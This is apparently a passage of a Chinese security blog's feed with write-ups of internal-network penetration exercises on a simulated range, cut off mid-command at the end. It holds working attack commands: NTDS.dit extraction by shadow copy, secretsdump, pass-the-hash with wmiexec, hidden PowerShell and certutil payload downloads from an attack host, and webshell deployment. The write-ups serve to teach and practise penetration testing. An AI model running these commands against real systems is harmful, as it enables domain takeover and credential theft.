class="line">flag&#123;Genius_only_means_hard-working_all_one's_life&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>直接反弹<code>MS17-010</code>的shell进行操作</strong></p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">bind_tcp</span> --&gt;</span> 失败</span><br><span class="line"><span class="function"><span class="title">bind_pipe</span> --&gt;</span> 失败</span><br></pre></td></tr></table></figure></li><li><p><strong>IPC操作</strong></p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">[*]</span> 不建议之操作</span><br><span class="line">添加添加系统隐藏账号密码进行IPC一系列操作</span><br><span class="line"><span class="string">[*]</span> 域管权限</span><br><span class="line">直接从域控IPC到DKRST011进行工具复制 --&gt; 拒绝访问</span><br></pre></td></tr></table></figure></li><li><p><strong>NTDS.dit</strong></p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">vssadmin create shadow /for=c: </span><br><span class="line">copy <span class="symbol">\\</span>?<span class="symbol">\G</span>LOBALROOT<span class="symbol">\D</span>evice<span class="symbol">\H</span>arddiskVolumeShadowCopy1<span class="symbol">\w</span>indows<span class="symbol">\N</span>TDS<span class="symbol">\N</span>TDS.dit c:<span class="symbol">\w</span>indows<span class="symbol">\t</span>emp<span class="symbol">\n</span>tds.dit </span><br><span class="line">copy <span class="symbol">\\</span>?<span class="symbol">\G</span>LOBALROOT<span class="symbol">\D</span>evice<span class="symbol">\H</span>arddiskVolumeShadowCopy1<span class="symbol">\w</span>indows<span class="symbol">\s</span>ystem32<span class="symbol">\c</span>onfig<span class="symbol">\S</span>YSTEM c:<span class="symbol">\w</span>indows<span class="symbol">\t</span>emp<span class="symbol">\s</span>ystem.hive</span><br><span class="line">vssadmin delete shadows /shadow=&#123;1xxxxx0b-e47d-xxxx-969f-8xxa4xxxx0xx&#125; /quiet</span><br><span class="line">最后通过 //172.16.88.21/SYSVOL 拖到 DKRST011 机器，本地恢复</span><br><span class="line">python secretsdump.py -ntds /root/ntds.dit -system /root/SYSTEM LOCAL</span><br><span class="line"></span><br><span class="line">域管理员的password为hash格式。</span><br><span class="line"></span><br><span class="line">后使用 CrackMapExec、wmiexec等工具进行进一步测试。</span><br></pre></td></tr></table></figure><p><strong>注：</strong>调用<code>Volume Shadow Copy</code>服务会产生日志文件，位于System下，<code>Event ID为7036</code></p></li></ul><h2 id="2）遇到问题"><a href="#2）遇到问题" class="headerlink" title="2）遇到问题"></a>2）遇到问题</h2><p>执行以下命令：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec<span class="selector-class">.py</span> -hashes LMHASH:NTHASH rcoil/administrator@<span class="number">172.16</span>.<span class="number">238.29</span> <span class="string">"c:\\payload.exe"</span></span><br></pre></td></tr></table></figure></p><p><code>Cobalt Strike</code>未上线，这个情况其实是第一次见。</p><p>以多种形式的<code>payload</code>运行也无果。</p><p>确认非协议问题，因为以同样的程序，在域用户权限下正常启动并上线。</p><h2 id="3）方案"><a href="#3）方案" class="headerlink" title="3）方案"></a>3）方案</h2><ul><li>获取明文密码，计划任务启动；</li><li>添加<code>HKLM自启注册表</code></li></ul><h1 id="0x05-获取域管明文密码"><a href="#0x05-获取域管明文密码" class="headerlink" title="0x05 获取域管明文密码"></a>0x05 获取域管明文密码</h1><p>使用<code>powerview</code>查询域管登陆过的机器：<br><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># Find-DomainUserLocation == old Invoke-UserHunter</span></span><br><span class="line"><span class="meta"># enumerate servers that allow unconstrained Kerberos delegation and show all users logged in</span></span><br><span class="line">Find-DomainUserLocation -ComputerUnconstrained -ShowAll</span><br></pre></td></tr></table></figure></p><p>最后选择了<code>172.16.10.29</code>的<code>win 2008 server</code>的机器，而且这台机器上存在<code>AdAudit Plus</code>。</p><p><img src="/image/【测试评估】内网练习（四）/blog_2019-03-25_16-37-30.png" alt="blog_2019-03-25_16-37-30"></p><p>由于目前没有任何容器可提供文件传输，所以自建。</p><ul><li><p>在<code>DKRST011</code>机器创建<code>FTP</code>或者<code>Web</code>服务；</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> SimpleHTTPServer</span><br><span class="line"><span class="keyword">import</span> SocketServer</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="type">PORT</span> = <span class="number">80</span></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"use: web.exe port"</span>)</span><br><span class="line"><span class="keyword">else</span>: </span><br><span class="line"><span class="type">PORT</span> = int(sys.argv[<span class="number">1</span>])</span><br><span class="line"><span class="type">Handler</span> = <span class="type">SimpleHTTPServer</span>.<span class="type">SimpleHTTPRequestHandler</span></span><br><span class="line">httpd = <span class="type">SocketServer</span>.<span class="type">TCPServer</span>((<span class="string">""</span>, <span class="type">PORT</span>), <span class="type">Handler</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">"SimpleHTTPServer is "</span>, <span class="type">PORT</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">"by k8gege"</span></span><br><span class="line">httpd.serve_forever()</span><br><span class="line">来源：https:<span class="comment">//raw.githubusercontent.com/k8gege/K8tools/master/web.py </span></span><br><span class="line">注：这类型操作也需要添加防火墙规则，防止弹窗</span><br><span class="line">netsh advfirewall firewall add rule name=<span class="string">"web.exe"</span> dir=<span class="keyword">in</span> program=<span class="string">"c:\Users\Public\Downloads\web.exe"</span> action=allow</span><br></pre></td></tr></table></figure></li><li><p>使用<code>certutil</code>、<code>bitsadmin</code>、<code>powersehll</code>等自带程序下载；</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">[*]</span> certutil -urlcache -split -f  http://<span class="number">172.16.238.29</span>/<span class="number">1</span>.rar <span class="number">2</span>.rar</span><br><span class="line"><span class="string">[*]</span> bitsadmin /rawreturn /transfer 任务名 http://<span class="number">172.16.238.29</span>/<span class="number">1</span>.rar <span class="number">2</span>.rar</span><br><span class="line"><span class="string">[*]</span> powershell -WindowStyle Hidden <span class="string">"IEX (New-Object Net.WebClient).DownloadFile('http://172.16.238.29/1.rar','c:\windows\temp\ 2.rar')"</span></span><br></pre></td></tr></table></figure><p>这里有人就会问了，为什么不将需要使用的东西放入到域共享目录里面，原因是要操作的机器访问域共享提示无法访问。</p></li></ul><p>往下就是<code>Procdump</code>的一些操作，成功获取到明文密码。</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">[*]</span> 高权限计划任务启动CS服务端，未上线。</span><br><span class="line"><span class="string">[*]</span> 添加HKLM自启动，未上线。</span><br><span class="line"></span><br><span class="line">这是什么问题呢？（未解决）</span><br></pre></td></tr></table></figure><h1 id="0x05-其余flag获取"><a href="#0x05-其余flag获取" class="headerlink" title="0x05 其余flag获取"></a>0x05 其余flag获取</h1><p>从提示与目的来判断，剩下的<code>2个flag</code>位于<code>demo.rcoil.local域</code>的域控、域用户名为<code>flagav</code>的机器上。</p><ul><li><p><code>flagav</code>用户机器<br>直接从<code>AdAudit Plus</code>获取到域用户<code>flagav</code>的登陆情况，这样就不用去翻日志了。<br>使用<code>CrackMapExec</code>、<code>wmiexec</code>等工具执行命令查找flag：</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">flag</span><span class="template-variable">&#123;Cease_to_struggle_and_you_cease_to_live&#125;</span><span class="xml"></span></span><br></pre></td></tr></table></figure></li><li><p>子域域控flag</p></li></ul><p>使用主域控的域管可直接登陆子域的域控</p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Success<span class="number">_</span>grows<span class="number">_</span><span class="keyword">out</span><span class="number">_</span><span class="keyword">of</span><span class="number">_</span>struggles<span class="number">_</span>to<span class="number">_</span>overcome<span class="number">_</span>difficulties&#125;</span><br></pre></td></tr></table></figure><h1 id="0x0x-最后的拓扑"><a href="#0x0x-最后的拓扑" class="headerlink" title="0x0x 最后的拓扑"></a>0x0x 最后的拓扑</h1><p>好多没去了解，就草草结束了。</p><p><img src="/image/【测试评估】内网练习（四）/网络拓扑.png" alt="网络拓扑"></p><p><strong>免责声明：</strong>文章中所提到的工具/教程，不得用于商业或非法用途，否则后果自负。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;环境为模拟环境，文章使用的均为公开测试工具且未涉及到各个方法的原理。&lt;/p&gt;
&lt;p&gt;分享便是我最好的老师。   ——Micropoor&lt;/p&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="https://rcoil.me/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="内网渗透" scheme="https://rcoil.me/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="测试评估" scheme="https://rcoil.me/tags/%E6%B5%8B%E8%AF%95%E8%AF%84%E4%BC%B0/"/>
    
  </entry>
  
  <entry>
    <title>【测试评估】内网练习（三）</title>
    <link href="https://rcoil.me/2019/01/%E3%80%90%E6%B5%8B%E8%AF%95%E8%AF%84%E4%BC%B0%E3%80%91%E5%86%85%E7%BD%91%E7%BB%83%E4%B9%A0%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    <id>https://rcoil.me/2019/01/【测试评估】内网练习（三）/</id>
    <published>2019-01-01T03:13:38.000Z</published>
    <updated>2019-11-01T01:46:55.864Z</updated>
    
    <content type="html"><![CDATA[<p>文章已脱敏，为了方便理解，IP未处理。</p><a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在渗透测试中，经常会遇到一些奇奇怪怪的环境。本文所采用的环境是一个红蓝对抗靶场，以贴切实际环境为出发点。</p><ul><li>目的：查找内网中找到<code>R9部门</code>中关键字为<code>flag_yinquesiting_rcoil</code>的文件（文档、数据库不限）。 </li><li>提示：域用户备注存在部门名称。</li></ul><ul><li><p>初始网络拓扑</p><p><img src="/image/【测试评估】内网练习（三）/初始网络拓扑.png" alt="Snipaste_2018-09-20_11-26-53"></p></li></ul><h1 id="0x01-靶机信息收集"><a href="#0x01-靶机信息收集" class="headerlink" title="0x01 靶机信息收集"></a>0x01 靶机信息收集</h1><p>入口点是工作组内普通的一台<code>win7系统权限</code>（可出外网 –&gt; <code>AttackVPS</code>），上线<code>Cobalt Strike</code>（使用https协议）进行操作。</p><ul><li><code>M238-RcoIl</code>的基本信息。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">机器名: M238-RcoIl</span><br><span class="line">权限: system权限</span><br><span class="line">系统: Windows <span class="number">7</span> Professional <span class="number">6.1</span><span class="number">.7601</span> Service Pack <span class="number">1</span> Build <span class="number">7601</span> x64</span><br><span class="line">Domain: WORKGROUP</span><br><span class="line">IP地址: <span class="number">10.20</span><span class="number">.238</span><span class="number">.29</span> （此C段纯工作组）</span><br><span class="line">杀软: Panda Endpoint Protection、McAfee、SMADAV (非最新版)</span><br><span class="line">已有操作: 密码拖取、全盘文件列表获取、浏览器浏览记录及密码、TCP连接及进程等相关基础操作</span><br><span class="line">额为信息: <span class="number">10.1</span><span class="number">.1</span><span class="number">.0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure><p>注：操作存在未成功状态。在操作时发现此靶机的流量明显受阻，初步研判是存在类似流量审计的系统。</p><p>在TCP连接及浏览器浏览记录中发现了一些内网IP，做记录。其余未发现有任何敏感信息，故此机器仅作跳板机即可。</p><p>由此机器（<code>M238-RcoIl</code>）作为<code>A跳板</code>，通过<code>Socks4代理</code>对所处网络C段进行常规的端口探测（Web、SMB、SSH、FTP、SMTP等），最后通过<code>MS-17-010</code>获取到<code>10.20.238.12</code>机器权限，上线<code>Cobalt Strike</code>进行操作。</p><ul><li>重复信息收集步骤</li></ul><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">机器名: Admin-RcoIl</span></span><br><span class="line"><span class="section">权限: system权限</span></span><br><span class="line"><span class="section">系统: Windows Vista Business 6.0.6000 N/A Build 6000 x86</span></span><br><span class="line"><span class="section">Domain: WORKGROUP</span></span><br><span class="line"><span class="section">IP地址: 10.20.238.12 （此C段纯工作组）</span></span><br><span class="line"><span class="section">杀软: Panda Endpoint Protection、SMADAV (非最新版)</span></span><br><span class="line"><span class="section">已有操作: 密码拖取、全盘文件列表获取、浏览器浏览记录及密码、TCP连接及进程等相关基础操作</span></span><br><span class="line"><span class="section">额为信息: 10.1.1.0/24</span></span><br></pre></td></tr></table></figure><p>注：操作存在未成功状态。</p><p>从信息收集情况来看，此机器仅多了几个内网连接，但这一台机器的网络环境比A跳板机好很多。故，由此机器作为<code>B跳板机</code>，同样是使用<code>Socks4</code>。</p><ul><li>此时网路拓扑为：</li></ul><p><img src="J:\blog_2019-01-14_18-33-14.png" alt="blog_2019-01-14_18-33-14"></p><p><img src="/image/【测试评估】内网练习（三）/blog_2019-01-14_18-33-14.png" alt="blog_2018-10-18_18-24-12"></p><h1 id="0x02-内网拓展-一"><a href="#0x02-内网拓展-一" class="headerlink" title="0x02 内网拓展 一"></a>0x02 内网拓展 一</h1><p>由于搭建的B跳板机网络较好，所以使用B跳板机。</p><p>对<code>10.1.1.0/24</code>进行常规的端口探测</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">SMB:</span> 探测无结果</span><br><span class="line"><span class="string">Web:</span> 利用点最好选为初始环境（默认配置）</span><br><span class="line">--&gt;<span class="string">http:</span><span class="comment">//10.1.1.133/rcoil/main/index.php RcoIl的窝-许可证注册管理系统</span></span><br><span class="line">--&gt;<span class="string">http:</span><span class="comment">//10.1.1.91 Tomcat管理页面</span></span><br><span class="line">其余情况: 无</span><br></pre></td></tr></table></figure><h2 id="一、web默认配置"><a href="#一、web默认配置" class="headerlink" title="一、web默认配置"></a>一、web默认配置</h2><p><code>10.1.1.133</code>这个web是默认配置（非CMS），并且存在<code>phpmyadmin</code>，尝试弱口令 –&gt; 进入后台 –&gt; 写入shell –&gt; 蚁剑连接 –&gt; 成功、系统权限（这就是默认配置的魅力 –&gt; 简洁快速）。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">机器名: WIN-B001</span><br><span class="line">权限: system权限</span><br><span class="line">系统: Windows<span class="built_in"> Server </span>2008 Standard 6.0.06002<span class="built_in"> Service </span>Pack 2 x64</span><br><span class="line">Domain: WORKGROUP</span><br><span class="line">IP地址: 10.1.1.133 （此C段存在域）</span><br><span class="line">杀软: 无</span><br><span class="line">已有操作: 密码拖取、全盘文件列表获取、浏览器浏览记录及密码、数据库帐密及数据库内容、TCP连接及进程等相关基础操作</span><br><span class="line">额外信息: TCP未存在已连接IP</span><br></pre></td></tr></table></figure><p>查看TCP连接，未发现任何的连接情况。上线<code>Cobalt Strike</code>未成功，此时查看连接，发现靶机与<code>AttackVPS</code>处于<code>SYN-SENT</code>状态，没有访问成功？经过探测，确定是出不来的状态，最后使用<code>smb</code>协议上线。</p><p>从它数据库中获取了一些密码，但感觉会没有作用，因为都是一些弱智密码。</p><h2 id="二、Tomcat默认配置"><a href="#二、Tomcat默认配置" class="headerlink" title="二、Tomcat默认配置"></a>二、Tomcat默认配置</h2><p>Tomcat是默认密码，部署war拿到系统权限，但是由于是jsp，蚁剑不支持，所以使用菜刀连接。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">机器名: PG-BUK</span><br><span class="line">权限: system权限</span><br><span class="line">系统: Windows<span class="built_in"> Server </span>2008 R2 Standard 6.1.7601<span class="built_in"> Service </span>Pack 1 Build 7601 x64</span><br><span class="line">Domain: demo.rcoil.me</span><br><span class="line">IP地址: 10.1.1.91 （此C段存在域）</span><br><span class="line">杀软: Panda Security (非最新版)</span><br><span class="line">已有操作: 密码拖取、全盘文件列表获取、浏览器浏览记录及密码、数据库帐密及数据库内容、TCP连接及进程等相关基础操作</span><br><span class="line">额外信息: 此机器8080端口为Apache服务</span><br></pre></td></tr></table></figure><p>在此机器上获取到了域管理员帐密（<code>DEMO\Administrator/test@demo02</code>），但是在此机器上获取不到别的域信息，报出<code>1355错误</code>。<code>powerview</code>运行报错。</p><p><code>8080</code>端口是一个端点资产管理系统，使用的是<code>xampp</code>。</p><p>查看量数，不得了，15K的量，这数据也是伪造得够狠的，分不清哪些是真是假，能不能通往。</p><p>查看数据库，是站库分离的，数据库在<code>10.1.1.16</code>，使用的是<code>mssql</code>，开启<code>xp_cmdshell</code>。</p><h2 id="三、数据库"><a href="#三、数据库" class="headerlink" title="三、数据库"></a>三、数据库</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">机器名: DCO-DB</span><br><span class="line">权限: 网络权限</span><br><span class="line">系统: Windows<span class="built_in"> Server </span>2008 R2 Standard 6.1.7601<span class="built_in"> Service </span>Pack 1 x64</span><br><span class="line">Domain: demo.rcoil.me</span><br><span class="line">IP地址: 10.1.1.16 （此C段存在域）</span><br><span class="line">杀软: Panda Security、Symantec (非最新版)</span><br><span class="line">已有操作: TCP连接及进程等相关基础操作</span><br><span class="line">额外信息: 使用获取的域管账号登陆失败、查询域内信息1355报错</span><br></pre></td></tr></table></figure><h2 id="四、SPN"><a href="#四、SPN" class="headerlink" title="四、SPN"></a>四、SPN</h2><p><code>SPN：</code>“服务主体名称(SPN)是由客户端对一个服务实例进行唯一标识的名称”。这意味着安装到Windows域中的每个服务都会被注册到活动目 录(Active Directory)中。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -T demo<span class="selector-class">.rcoil</span><span class="selector-class">.me</span> -Q *<span class="comment">/*</span></span><br></pre></td></tr></table></figure><p>使用这个对于信息收集也很快速。但是这里出现错误</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Ldap <span class="builtin-name">Error</span>(0x51 --<span class="built_in"> Server </span>Down): ldap_connect</span><br><span class="line">Failed <span class="keyword">to</span> retrieve DN <span class="keyword">for</span> domain <span class="string">"demo.rcoil.me"</span> : 0x00000051</span><br><span class="line">Warning: <span class="literal">No</span> valid targets specified, reverting <span class="keyword">to</span> current domain.</span><br><span class="line">Ldap <span class="builtin-name">Error</span>(0x51 --<span class="built_in"> Server </span>Down): ldap_connect</span><br><span class="line"><span class="builtin-name">Error</span> occured when searching <span class="keyword">for</span> existing SPN: 0x00000051</span><br></pre></td></tr></table></figure><h1 id="0x03-内网拓展-二"><a href="#0x03-内网拓展-二" class="headerlink" title="0x03 内网拓展 二"></a>0x03 内网拓展 二</h1><h2 id="一、SMB协议"><a href="#一、SMB协议" class="headerlink" title="一、SMB协议"></a>一、SMB协议</h2><p><code>WIN-B001</code>机器作为<code>C跳板机</code>。</p><p>进行C段SMB识别，发现是可以探测出来版本等信息。因此可知，B跳板机的网段是被做了些隔离限制。</p><p>先大概摸清网络拓扑，接下来进行以下操作：</p><ul><li>从资产管理系统抽取IP段；</li></ul><ul><li>对抽取的IP段进行SMB信息探测，但可能会有隔离等策略限制；</li><li>使用<code>MS-17-010</code>配合进行漏洞检测；</li><li><code>MS-17-010</code>的漏洞作用为添加隐藏账号</li></ul><p>最后共计有226台机器检测出存在漏洞。从筛选SMB信息探测结果来看，此机器可到达内网域有6个。看了看数据，总感觉漏了东西，如果这些信息没有帮助的话，就对<code>10.0.0.0/8</code>进行全面识别了。</p><h2 id="二、SMB协议利用"><a href="#二、SMB协议利用" class="headerlink" title="二、SMB协议利用"></a>二、SMB协议利用</h2><p>使用<code>Cobalt Strike</code>批量测试上线外网情况，有一台（<code>NSVC-001_10.160.5.51</code>）机器成功上线。并且这台机器没有任何的杀软限制（后续因忽略了流量审计系统的问题，掉线），接下来的操作都是基于这台机器做的<code>D跳板</code>。</p><p>使用<code>NSVC-001_10.160.5.51</code>作为<code>根beacon</code>，<code>smb协议</code>上线<code>PG-BUK_10.1.1.91</code>。</p><p>从探测结果选择一个域名为<code>ba.demo.me</code>且存在<code>MS-17-010漏洞的机器</code>，从<code>PG-BUK_10.1.1.91</code>使用<code>smb协议</code>上线<code>BA-AS02_10.0.1.34</code></p><h2 id="三、ba-demo-me域"><a href="#三、ba-demo-me域" class="headerlink" title="三、ba.demo.me域"></a>三、ba.demo.me域</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">机器名: BA-AS02</span><br><span class="line">权限: system权限</span><br><span class="line">系统: Windows<span class="built_in"> Server </span>2008 R2 Standard  x64 备份域控</span><br><span class="line">Domain: ba.demo.me</span><br><span class="line">IP地址: 10.0.1.34</span><br><span class="line">杀软: 无</span><br><span class="line">已有操作: 密码拖取、全盘文件列表获取、浏览器浏览记录及密码、TCP连接及进程等相关基础操作</span><br><span class="line">额外信息: 获取到域管理员账号密码、域信任关系</span><br></pre></td></tr></table></figure><p>从这一台机器上面的信息可疑判断，这个靶场环境是存在<code>PacketShaper</code>，非常的贴切。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># 查看域控制器</span><br><span class="line"><span class="keyword">c</span>:\Users\Public\Downloads&gt; nltest /dclis<span class="variable">t:ba</span>.demo.<span class="keyword">me</span></span><br><span class="line">Get <span class="keyword">list</span> of DCs in domain <span class="string">'ba.demo.me'</span> from <span class="string">'\\BA-AS02.ba.demo.me'</span>.</span><br><span class="line">    BA-AS02.<span class="keyword">ba</span>.demo.<span class="keyword">me</span>        [DS] Site: Default-First-Site-Name</span><br><span class="line">    BA-AM02.<span class="keyword">ba</span>.demo.<span class="keyword">me</span>        [DS] Site: Default-First-Site-Name</span><br><span class="line">    BA-AS01.<span class="keyword">ba</span>.demo.<span class="keyword">me</span> [PDC]  [DS] Site: Default-First-Site-Name</span><br><span class="line">The <span class="keyword">command</span> completed successfully</span><br><span class="line"></span><br><span class="line"># 查看域信任关系</span><br><span class="line"><span class="keyword">c</span>:\Users\Public\Downloads&gt; nltest /domain_trusts</span><br><span class="line">List of domain trust<span class="variable">s:</span></span><br><span class="line">    <span class="number">0</span>: PH ph.<span class="keyword">ba</span>.demo.<span class="keyword">me</span> (NT <span class="number">5</span>) (Direct Outbound) (Direct Inbound)</span><br><span class="line">    <span class="number">1</span>: SH <span class="keyword">sh</span>.<span class="keyword">ba</span>.demo.<span class="keyword">me</span> (NT <span class="number">5</span>) (Direct Outbound) (Direct Inbound)</span><br><span class="line">    <span class="number">2</span>: KL kl.<span class="keyword">ba</span>.demo.<span class="keyword">me</span> (NT <span class="number">5</span>) (Direct Outbound) (Direct Inbound)</span><br><span class="line">    <span class="number">3</span>: KD kd.<span class="keyword">ba</span>.demo.<span class="keyword">me</span> (NT <span class="number">5</span>) (Direct Outbound) (Direct Inbound)</span><br><span class="line">    <span class="number">4</span>: SW <span class="keyword">sw</span>.<span class="keyword">ba</span>.demo.<span class="keyword">me</span> (NT <span class="number">5</span>) (Direct Outbound) (Direct Inbound)</span><br><span class="line">    <span class="number">5</span>: PS <span class="keyword">ps</span>.<span class="keyword">ba</span>.demo.<span class="keyword">me</span> (NT <span class="number">5</span>) (Direct Outbound) (Direct Inbound) ( Attr: quarantined )</span><br><span class="line">    <span class="number">6</span>: BA <span class="keyword">ba</span>.demo.<span class="keyword">me</span> (NT <span class="number">5</span>) (Forest Tree Root) (Primary Domain) (Native)</span><br><span class="line">The <span class="keyword">command</span> completed successfully</span><br><span class="line">不得了，居然有子域，而且目前位置是在根域。</span><br></pre></td></tr></table></figure><p>其实这一台机器上面的web服务也是默认的<code>xampp</code>，但是<code>phpmyadmin</code>只允许本地访问，而且首页做了跳转。</p><p>在对<code>BA-AS02_10.0.1.34</code>进行信息收集时，<code>D跳板机</code>断开连接，经初步研判，应该是管理员对机器进行了维护。所以使用<code>B跳板机</code>继续操作。</p><p>此域存在200+用户，并未发现关键词。利用<code>SPN</code>识别域内的<code>SQL服务</code>，并未发现，故放弃此域。</p><p>接下来往其他域着手。</p><h1 id="0x0x-最后的思维导图"><a href="#0x0x-最后的思维导图" class="headerlink" title="0x0x 最后的思维导图"></a>0x0x 最后的思维导图</h1><p><img src="/image/【测试评估】内网练习（三）/Snipaste_2018-09-20_11-26-53.PNG" alt="Snipaste_2018-09-20_11-26-53"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;文章已脱敏，为了方便理解，IP未处理。&lt;/p&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="https://rcoil.me/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="内网渗透" scheme="https://rcoil.me/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="测试评估" scheme="https://rcoil.me/tags/%E6%B5%8B%E8%AF%95%E8%AF%84%E4%BC%B0/"/>
    
  </entry>
  
  <entry>
    <title>【域渗透】获取域环境内用户登录信息</title>
    <link href="https://rcoil.me/2018/11/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91%E8%8E%B7%E5%8F%96%E5%9F%9F%E7%8E%AF%E5%A2%83%E5%86%85%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF/"/>
    <id>https://rcoil.me/2018/11/【域渗透】获取域环境内用户登录信息/</id>
    <published>2018-11-26T08:06:48.000Z</published>
    <updated>2019-10-31T15:44:50.000Z</updated>
    
    <content type="html"><![CDATA[<p>之前见到有人在讨论<a href="https://www.t00ls.net/viewthread.php?tid=47649&amp;extra=&amp;page=1" target="_blank" rel="noopener">域内用户在域内的机器ip怎么查呢</a>，集思广益，结合答复及自己的观点，总结了以下内容。<br><a id="more"></a></p><h2 id="0x00-adfind"><a href="#0x00-adfind" class="headerlink" title="0x00 adfind"></a>0x00 adfind</h2><p>有时候管理员会设置域用户只可以登录指定的的域内计算机，使用 adfind或者 powerview导出域用户信息可以查看；<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">查看域内用户详细信息：</span><br><span class="line">adfind.exe -h DNS_SERVER_IP -sc <span class="string">u:</span>rcoil(目标用户)</span><br><span class="line">adfind.exe -h DNS_SERVER_IP -sc <span class="string">u:</span>rcoil | findstr userWorkstations <span class="comment">//非域权限执行需要指定账户密码</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">查看域内所有用户详细信息：</span><br><span class="line">AdFind.exe -h 